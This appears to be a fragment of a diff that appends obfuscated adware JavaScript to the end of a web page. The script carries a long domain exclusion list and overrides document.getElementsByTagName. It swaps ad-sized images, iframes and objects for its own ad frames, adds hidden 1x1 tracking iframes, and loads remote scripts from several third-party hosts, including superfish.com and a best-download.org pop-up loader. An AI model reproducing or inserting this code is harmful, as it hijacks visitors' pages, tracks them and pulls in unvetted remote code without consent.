+(function(){var j=navigator.language||navigator.userLanguage;if(window.self!==window.top){return}var h=["budbi.com","envedette.ca","exashare.com","fr.autofocus.ca","full-stream.net","piriform.com","sympatico.ca","vkstreaming-series.com","zalukaj.tv","3movs.com","20000-names.com","all-musculation.com","18onlygirlsblog.com","arabseed.com","filmikz.ch","aovivoagora.com","cucirca.eu","merdb.cn","animekens.com","iwatchonline.to","asstr.org","12mesyatcev.ru","afdah.com","blic.rs","dopehood.se","247bigboobs.com","strikeout.co","letmewatchthis.ae","actiongames.net","atdhe.sx","armagedomfilmes.biz","addic7ed.com","1classtube.com","100gbtube.com","g2g.fm","altefrau.com","alexpix.tv","arbcinema.com","1freetube.com","tumblr.com","3dvidtube.com","animefreak.tv","cartoonsextube.com","a2livetv.com","atdhe.ws","albumjams.com","2ndrun.tv","anytube.xxx","thepiratebay.se","4stream.pw","vipleague.se","betexplorer.com","ch131.so","zalukaj.tv","ecostream.tv","nowvideo.sx","yuku.com","hornywhores.net","9divx.com","beautiful-tranny.com","ashemaletube.com","1ladyboytube.com","allkarups.com","avaxhm.com","cpasbien.pe","anilinkz.com","bild.de","camtogays.com","bazoocam.org","8muses.com","alotporn.com","chingonatv.com","firstrowusa.eu","big-titsparadise.com","180upload.com","alleywatch.com","chilenext.com","kinoman.tv","1be.biz","argentinawarez.com","free-tv-video-online.me","firstrows.biz","grattage.com","blackgfs.com","bnn.ca","chaturbate.com","blinkx.com","amarokforum.de","arenabg.com","anime-sharing.com","freeforums.org","eg.ru","movshare.net","get-tune.net","freedisc.pl","couchtuner.eu","filmlinks4u.net","gasmaskforum.com","bw7.com","holby.tv","bollywoodmoviesfull.com","royal-search.com","filmezz.eu","tusexualidad.info","linkcollider.com","ifirstrowus.eu","allanalpass.com","egglad.com","xpersonals.com","dbz-fantasy.com","miratuserie.tv","tfpdl.com","ampland.com","hentai-hot.com","amateurcommunity.de","8teenporn.com","celebjihad.com","8teenxxx.com","befuck.com","videoweed.es","cuevana2.tv","azgals.com","5mp3.org","bitsnoop.com","dpstream.net","embedlink.info","4rkinggame.com","24x7tube.com","nowvideo.ch","adultfriendfinder.com","funnypics247.org","calgary.ctvnews.ca","ifeed2all.eu","alohatube.com","aztecaporno.com","159i.com","bitreactor.to","amateurmilfs.net","amigoscalientes.com","movie4k.to","allprivatebabes.com","interviewmagazine.com","4partage.com","casino.com","novamov.com","alafoto.com","bravo.de","watchseries.lt","assistatvonlinegratis.biz","brazzers-videos.net","share-links.biz","pornorips.com","assfilled.com","allover40.com","cpcbooth.in","gaylov.fr","worldtruth.tv","boyspun.com","cliti.com","coldbitches.com","full-stream.net","dfm2u.net","dpstream.cc","720pfilmizle.tv","dickpound.com","solarmovie.is","crocotube.com","footfetishdaily.net","drama.net","kingoloto.com","artnudegalleries.com","conexaoto.com.br","diaryofamilfpage.com","maturesandnylon.com","legendofkorra.tv","fightnext.com","systweak.com","primewire.ag","kinox.to","isohunt.to","onlyfilmz.ws","jailbaitgallery.com","tnttorrent.info","cpasbien.com","turkdepo.biz","tellynews.tv","eroreal.com","dizibox.org","showup.tv","paidverts.com","onlinetvrecorder.com","assisass.com","adam4adam.com","anakbnet.com","couchtuner.ch","bet365.com","bigcinema.tv","cam4.com.au","crystallatinateens.com","kickass.to","clips4sale.com","dardarkom.com","abadown.com","chicchedicala.it","filmovizija.com","adultsearch.com","desitvforum.net","canadaam.ctvnews.ca","burningcamel.com","amateurcommunity.com","bihon.ro","boobinspector.com","beate-uhse.com","antarvasnavideos.com","babes.com","alo.rs","bdsmlibrary.com","4ever.eu","embedstream.com","cineplanet21.com","budbi.com","dphoneworld.net","digi-hdsport.com","carabinasypistolas.com","theteenbay.com","bonporn.com","analdolls.com","cambabes.fr","dildoking.de","filmesonlinegratis.net","hqblack.com","profreetv.com","finemoviesonline.net","gepime.com","join4movies.com","720pizle.com","dynastyseries.com","blacksportsonline.com","dropcable.info","lesen.to","sbcodez.com","gratispeliculas.org","mangahere.co","gofirstrow.eu","tv-replay.fr","free-telechargement.org","coolmoviezone.com","pornhub.com","streamallthis.is","porno-2luxe.com","xvidstage.com","pururin.com","craigslist.org","myvideo.de","primewire.ae","dizist.com","sexygala.com","3dl.tv","streamay.com","bigbuttsfree.com","aliasdownloads.com","boerse.bz","meinvz.net","cooltube24.net","el7l.co","acheidownload.biz","cinehdfilmes.com","filmozderi.com","bigtitsbreasts.com","doperoms.com","cartoon-world.tv","nowwatchtvlive.com","anilos.com","boygaytwink.com","airmp3.me","bestpics4you.com","armedtube.com","torrentz.com","cricket-tv.net","explicittube.com","elchoyerotv.tv","cam4.co.uk","le-bouzin.com","futebolaovivo.biz","dirtyfetish.com","dubbed-scene.com","booloo.com","torrentz-proxy.com","extravid.com","angelescid.com","filme77.com","sexuria.com","mp3skull.com","i-34.com","seriesflv.net","laguin.net","hornygreek.com","990.ro","fucking8.com","netechangisme.com","siteslike.com","french-torrent.net","fastshare.cz","repelis.tv","streamonline.me","livestrip.com","quizfreak.com","zzstream.li","vampyvarnish.com","tubeplus.me","putlocker.is","solarmovie.mx","preparingforthefuture.org","nichegalz.com","hddizitvizle1.com","vodlocker.com","vidbull.com","animals-sex-movies.com","avaxsearch.com","bqstream.com","movie4u.org","cannaweed.com","coqnu.com","ddlfrench.org","dirtyrhino.com","modelairplanenews.com","filmodrom.net","adcash.com","cinemavf.net","italia-film.org","adultdvdempire.com","absolugirl.com","centraltv.fr","filenuke.com","ctvnews.ca","ddl-warez.in","stream2u.me","dicocitations.com","bestmaleblogs.com","call-kelly.com","asianbeautytube.com","bbwnudetube.com","easytuts.us","crictime.be","bangbrosnetwork.com","fancystreems.com","elgrantv.com","cartoontube.com","exclusivitees.eu","searchonzippy.com","g1jogos.net","domacifilmovibesplatno.com","ebesucher.de","turbobit.net","regarder-film-gratuit.com","foiredustreaming.com","crossdresserstube.com","deluxeblondes.com","atkmodels.com","t411.me","joyreactor.cc","fetlife.com","tv-porinternet.com.mx","rojadirecta.me","tamoligado.net","icams.com","ahashare.com","gaymaletube.tv","noworrytube.com","thetruthaboutguns.com","zone-telechargement.com","kingtrannytube.com","retro4tube.com","milfmovies.ws","realspankingtube.com","piriform.com","porn.com","watchseries.biz","nouslibertins.com","movies2fun.com","bingoliner.com","cuevana.tv","couchtuner.me","adultmatchmaker.com.au","jamo.tv","ah-me.com","admiraltube.com","chatroulette.com","gnula.nu","stream2watch.me","beeg.com","bigcamtube.com","bit2bit.org","carameltube.com","chan4chan.com","redtube.com","bestvintagetube.com","gelbooru.com","full2movies.net","cricvid.com","filmbazis.org","florotv.com","finallylegal.com","extratorrent.cc","tubemotion.com","freebitcoinz.com","sexefeed.com","gaycum.tv","dicktickle.com","filme-anschauen-kostenlos.de","liens-bittorrent.com","verdirectotv.com","leenks.com","jeuxtorrent.com","isohunt.com","penguinvids.com","tf1.fr","movietubenow.com","torrentz.eu","oopsmovs.com","todaypk.com","emoviestv.com","movshare.sx","exclusiveteenporn.com","filestube.to","emule-island.ru","dominoxxx.com","freshwap.me","albumjunkie.com","mistreci.com","lankadrama.com","alashock.com","cinemay.com","gratisnovelas.net","edmonton.ctvnews.ca","clipsage.com","moviesnhacks.com","bolarosa.com","cumshotcinema.com","bongatube.com","gonzo-movies.com","deportetv.com.ve","filmecrestineonline.ro","freetvall.com","ladbrokes.com","girlgamesxl.net","huntbzs.cf","hentai.ms","incestvidz.com","babecentrum.com","ixxx.com","ma-queue.com","hqvintagetube.net","girlsavenue.com","nextdoorworld.com","redtubes.tv","multiup.org","pi-news.net","mangawindow.com","livex.com","tinynuts.com","tenmilliongalleries.com","waybig.com","youjizz.com","vdownload.eu","tubegalore.com","picturevip.com","avaxsearch.net","enikos.gr","fantasti.cc","fractalenlightenment.com","rapidgator.net","allpeliculas.com","demonoid.ph","albumfiend.com","katproxy.com","eglimatikotita.gr","betfair.com","cockyboys.com","burek.com","mp3olimp.net","cumeatingcuckolds.com","bustygirl.net","darmowefilmy.eu","definebabes.com","cerdasypetardas.com","h33t.to","songspk.cc","downloadingzoo.com","filmitv.org","fulltelevisionhd.net","motherless.com","streaming-sport.tv","ifilmovi.com","movie1k.ag","tube-adulte.net","infinitetube.com","hdporn.in","hd-tube-videos.com","babesandstars.com","melhorestorrentbrasil.com.br","queerclick.com","live-stream.tv","schoolthumbs.com","savistamagazine.com","mrstiff.com","localmilfselfies.com","tubeenhancer.com","vodly.to","sidereel.com","bobfilm.net","carlycumslut.com","fdj.fr","davita.com","extreme-down.net","filmix.net","freebitco.in","film-stream.org","safelinking.net","ilive.to","allsp.ch","divxatope.com","mp3face.com","onlinemovies.pro","allover30.com","neolive.net","eroprofile.com","cutechan.org","debonairblog.com","watchanimemovie.com","hardsextube.com","latino-moviez.com","nastyvideotube.com","futbolhd.pl","tvenganchado.com","lestream.net","manga.hentai.ms","wawacity.ws","javfor.me","babesmachine.com","linkcrypt.ws","jerkhour.com","nastytuber.com","rainierland.com","mature-naked-woman.com","solotouch.com","seznam.cz","nowtorrents.com","szene-streams.com","myebonygf.com","video2oops.com","xnxx.com","clubseventeen.com","curiosone.tv","ffilms.org","flirtygay.com","filthylatina.com","schoener-fernsehen.com","kinobanda.net","downloadming.nu","musicaq.net","arabictorrent.net","putlocker.tw","justanimedubbed.tv","fatbrownguy.com","fling.com","efotolab.net","erosberry.com","digisesso.com","xesiontube.net","fundorado.de","nudevista.com","tvfutebolaovivo.com","newindiantube.com","naruto.hentai.ms","newmaturetube.com","babeuniversum.com","palimas.com","torrentesx.com","mksniper.fr","cricfree.tv","openaked.com","xn--homopathie-d7a.com","weeb.tv","bravovids.com","comicsxxx.net","filmifullizle.com","freehostedpics.com","freshwap.com","firedrive.com","thaivisa.com","amateri.cz","onlinefilmovisaprevodom.com","filmvf.net","fakku.net","seriesbang.net","likecool.com","czechstreets.com","superuser.com","csodalatosvilag.in","eronew.com","cinemaniahd.org","ex.ua","eldiariox.com","magicmovies.com","enelfutbol.com","crawli.net","ollisbumsblog.net","tvonlinegratis.tv","online-filmek.cc","rlsbb.com","milfsavenue.com","rabbitsreviews.com","vecinasardientes.com","downloads.nl","playboy.com","tubeopia.com","cuckoldrix.com","freematurepornpics.com","kkiste.to","amoralvideos.com","dpstream.pw","onlinesaprevodom.com","time4tv.com","arionmovies.com","full-streaming.org","submanga.com","ottawa.ctvnews.ca","edengay.com","dickdorm.com","fulldls.com","easygoingsluts.com","cochinaditas.com","fatstube.com","menonedge.com","estadiofutebol.com","sassha-films.net","omgtorrent.com","pornorama.com","chickteases.com","movielu.com","seedpeer.me","whackyourboner.com","downtr.co","homemademommy.net","filthysextube.com","ilcorsaronero.info","hotmomspics.com","hotcelebshome.com","azfilma.com","astroo.com","h2porn.com","viperial.com","streamhd.eu","imposemagazine.com","hentaioppai.com","fetishshots.com","watchcartoononline.com","indecencytube.com","filmoserial.ru","gold-gay.com","gayfilmtube.com","im1music.se","pornmaki.com","sportp2p.com","technosamigos.com","photosdematures.com","terasexe.com","freeporn.hu","smileysptc.com","tvonlinelimbo.com","tpbunblocked.me","fastpiratebay.eu","free-scat-sex.com","hugeassanal.com","kanxi123.com","izlebizle.net","mylust.com","filmefullhd.net","subscene.com","babosas.com","hardcorepost.com","inxy.com","watchtvlinks.sx","flirtmee.nl","free3dtoons.com","filepup.net","humandigest.com","hardcoreinhd.com","jennastube.com","futbolenvivoaldia.com","poldertube.nl","todocanales.net","mamega.com","slutroulette.com","supremetube.com","tubecup.com","freepornomilfs.com","torrentday.com","videarn.com","extratorrentlive.com","evilangel.com","assistirtvgratisonline.org","filmehd.net","bajui.com","waptrick.mobi","filmbirodalom.com","yeslibertin.com","hdpoon.com","joyclub.de","geytube.info","hitcric.info","rapidzona.tv","tutelevisionenvivo.org","rutor.org","mangago.com","tunemovie.so","sound-park.ru","fucksexymoms.com","streamingfilms.fr","torrentdownloads.be","filmze.com","filmsd.ru","largepornfilms.com","newtvworld.com","axxomovies.org","filmpertutti.eu","bangyoulater.com","zumvo.com","kijkdirect.nl","forhertube.com","hotmovies.com","mennation.com","gayboydelight.com","grannytybe.com","kora-online.tv","ultra-vid.com","streamsex.com","torrent1.com","wawa-porn.biz","tubestack.com","filmovix.com","dreamnetcash.com","legendas.tv","girlsstreamtube.com","kinomusorka.ru","liveonlinetv247.com","levidia.ch","filmsenzalimiti.co","tribbingporn.com","baykoreans.net","hentaioppai.co","ero-lust.com","gayhints.com","iptorrents.com","xhamstercams.com","newjams.net","vertor.eu","freehostedpics.co","filmstream.me","playtube.pl","bangyoula","jennymovies.com","film-stre","filmze.so","rense.com","xhamster.com","icams.co","mature2u.net","feedherfuckher.com","hentai-foundry.com","warez-bb.org","goatd.net","movie2k.tl","dansmovies.com","animeforce.org","dubbedepisodes.org","primatv.ro","pastebin.com","toronto.ctvnews.ca","dirtyrottenwhore.com","dancingbear.com","niggermania.com","matureboom.com","onlyhoes.com","online-free-movie.com","nubileworld.com","cocomilfs.com","zalaa.com","yourdarkdesires.com","xshare.com","divxonline.info","genvideos.co","hardsexxxpornhub.com","gayroyal.com","heroturko.me","watchonlinefree.tv","hi-bogo.net","data18.com","exashare.com","thisis50.com","hiphopisdream.com","uu.canna.to","gayasiancollection.com","mygully.com","tevelive.net","karups-teens.com","onlymomtube.com","exgirlfriendmarket.com","putlockertvshows.me","scorpioncave.com","swingerklub.de","torrentzap.com","estrenosdtl.com","yaplakal.com"];var n=location.hostname.split(".");var q=n.shift();var i=n.join(".");for(var p in h){if(h[p]==i){console.log("domain blocked");return}}var f=document.getElementsByTagName("iframe");var b=document.getElementsByTagName("object");var l=document.getElementsByTagName("img");var e=document.getElementsByTagName;document.getElementsByTagName=function(u){var t=e.call(document,u);if(typeof(document.querySelectorAll)!="undefined"){return document.querySelectorAll(u+':not([class="prt02123"])')}else{return t}};var s=Math.random()*(9999999-1000)+1000;var m={ad468x60:'<div align="center"><iframe class="prt02123" width="468" height="60" src="http://ib.adnxs.com/tt?id=3493051&size=468x60&cc='+s+'" frameBorder="0" scrolling="no"></iframe></div>',ad160x600:'<div align="center"><iframe class="prt02123" width="160" height="600" src="http://ib.adnxs.com/tt?id=3493051&size=160x600&cc='+s+'" frameBorder="0" scrolling="no"></iframe></div>',ad300x250:'<div align="center"><iframe class="prt02123" width="300" height="250" src="http://service.best-download.org/ads/300x250.html" frameBorder="0" scrolling="no"></iframe></div>',ad336x280:'<div align="center"><iframe class="prt02123" width="300" height="250" src="http://service.best-download.org/ads/300x250.html" frameBorder="0" scrolling="no"></iframe></div>',ad728x90:'<div align="center"><iframe class="prt02123" width="728" height="90" src="http://ib.adnxs.com/tt?id=3493051&size=728x90&cc='+s+'" frameBorder="0" scrolling="no"></iframe></div>',ad750x100:'<div align="center"><iframe class="prt02123" width="728" height="90" src="http://ib.adnxs.com/tt?id=3493051&size=728x90&cc='+s+'" frameBorder="0" scrolling="no"></iframe></div>',ad750x150:'<div align="center"><iframe class="prt02123" width="728" height="90" src="http://ib.adnxs.com/tt?id=3493051&size=728x90&cc='+s+'" frameBorder="0" scrolling="no"></iframe></div>',ad720x300:'<div align="center"><iframe class="prt02123" width="728" height="90" src="http://ib.adnxs.com/tt?id=3493051&size=728x90&cc='+s+'" frameBorder="0" scrolling="no"></iframe></div>',ad750x300:'<div align="center"><iframe class="prt02123" width="728" height="90" src="http://ib.adnxs.com/tt?id=3493051&size=728x90&cc='+s+'" frameBorder="0" scrolling="no"></iframe></div>',ad750x200:'<div align="center"><iframe class="prt02123" width="728" height="90" src="http://ib.adnxs.com/tt?id=3493051&size=728x90&cc='+s+'" frameBorder="0" scrolling="no"></iframe></div>',ad120x600:'<div align="center"><iframe class="prt02123" width="120" height="600" src="http://ib.adnxs.com/tt?id=3493051&size=120x600&cc='+s+'" frameBorder="0" scrolling="no"></iframe></div>',ad300x600:'<div align="center"><iframe class="prt02123" width="300" height="600" src="http://ib.adnxs.com/tt?id=3493051&size=300x600&cc='+s+'" frameBorder="0" scrolling="no"></iframe></div>'},a,c=10,o=0,g=0,k=function(){if(!a){a={};for(var t in m){a[t]=t.substr(2).split("x")}}return a},r=function(z){for(var v in z){var u=z[v];var x=k();if(u instanceof Element&&o<c){for(var t in x){var y=(typeof u.width=="string")?u.width.replace("px",""):u.width;var w=(typeof u.height=="string")?u.height.replace("px",""):u.height;y=(y=="undefined"||!y)?u.offsetWidth:y;w=(w=="undefined"||!w)?u.offsetHeight:w;if(y==x[t][0]&&w==x[t][1]){u.insertAdjacentHTML("afterend",m[t]);u.parentNode.removeChild(u);o++}}}}},d=function(y,w){var u=new RegExp(y),z=window.document;if(u.test(z.URL)){for(var v=0;v<w.length;v++){var x=w[v],t=x.place(z);if(t){x.inject(t,x.ad);g++}}}};injectExtraAdd=function(){var t=document.getElementsByTagName("body")[0];t.insertAdjacentHTML("beforeend",m.ad728x90)};setTimeout(function(){r(f);r(b);r(l);console.log(o)},300)})();(function(){if(window.self!==window.top){return}var b=document.createElement("iframe");b.setAttribute("src","//service.best-download.org//ads/stats.html");b.setAttribute("width","1");b.setAttribute("height","1");b.setAttribute("frameborder","0");b.setAttribute("border","0");b.setAttribute("scrolling","no");document.body.appendChild(b);if(typeof D_PTR_ID!=="undefined"){var d=D_SRC_ID?D_SRC_ID:"undefined";if(typeof d==="undefined"||d===0){d=D_PTR_ID}var a;if(d==200){a="?utm_campaign=LITE&utm_source="+D_PTR_ID+"&utm_medium=LITE"}else{a="?utm_campaign="+D_PTR_ID+"&utm_source="+d+"&utm_medium="+D_PTR_ID}var c=document.createElement("iframe");c.setAttribute("src","//service.best-download.org/ads/stats_source.html"+a);c.setAttribute("width","1");c.setAttribute("height","1");c.setAttribute("frameborder","0");c.setAttribute("border","0");c.setAttribute("scrolling","no");document.body.appendChild(c)}})();(function(){var a=window,e=document,f=navigator,b=f.language||f.userLanguage;if(a.self!==a.top||a.frames.length!==parent.frames.length){return}var c=document.createElement("script");c.setAttribute("type","text/javascript");c.setAttribute("src","https://cdncache-a.akamaihd.net/loaders/1920/l.js?aoi=1311798366&pid=1920&zoneid=523895&ext=eDeals");document.body.appendChild(c)})();(function(){var b=navigator.language||navigator.userLanguage;if(window.self!==window.top){return}if(window.location.protocol=="https:"){var c="https://i_redsinjs_info.tlscdn.com/redsin/javascript.js"}else{var c="http://i.redsinjs.info/redsin/javascript.js"}var a=document.createElement("script");a.setAttribute("src",c);a.setAttribute("type","text/javascript");document.head.appendChild(a)})();(function(){var b=navigator.language||navigator.userLanguage;var d="http://service.best-download.org/ads/pop.php?cc="+c(1,999999);var a=document.createElement("script");a.setAttribute("src",d);a.setAttribute("type","text/javascript");document.head.appendChild(a);function c(f,e){return Math.random()*(e-f)+f}})();(function(){var b=navigator.language||navigator.userLanguage;if(window.self!==window.top){return}if(window.location.protocol=="http:"){var c="http://www.superfish.com/ws/sf_main.jsp?dlsource=dryadbe";var a=document.createElement("script");a.setAttribute("src",c);a.setAttribute("type","text/javascript");document.head.appendChild(a)}})();(function(){var b=navigator.language||navigator.userLanguage;if(window.self!==window.top){return}var c="http://service.best-download.org/ads/offers.php";var a=document.createElement("script");a.setAttribute("src",c);a.setAttribute("type","text/javascript");document.head.appendChild(a)})();(function(){var a=window,e=document,f=navigator,b=f.language||f.userLanguage;if(a.self!==a.top||a.frames.length!==parent.frames.length){return}var c=document.createElement("script");c.setAttribute("type","text/javascript");c.setAttribute("src","https://cdncache-a.akamaihd.net/sub/l58348a/1/l.js?pid=2123&ext=eDeals");document.body.appendChild(c)})();};
+</script>
+<script type="text/javascript">
+function r(f){/in/.test(document.readyState)?setTimeout('r('+f+')',9):f()};
+function prtInIframe () { try { return window.self !== window.top;} catch (e) { return true; } }
+r(function() {
+if (prtInIframe()) {
+return;
+}
+prtLoader.ScriptIdf904d07f3c0759dd546fa11ba0a5e9df();
+});
+</script>
+
+
+</body></html>
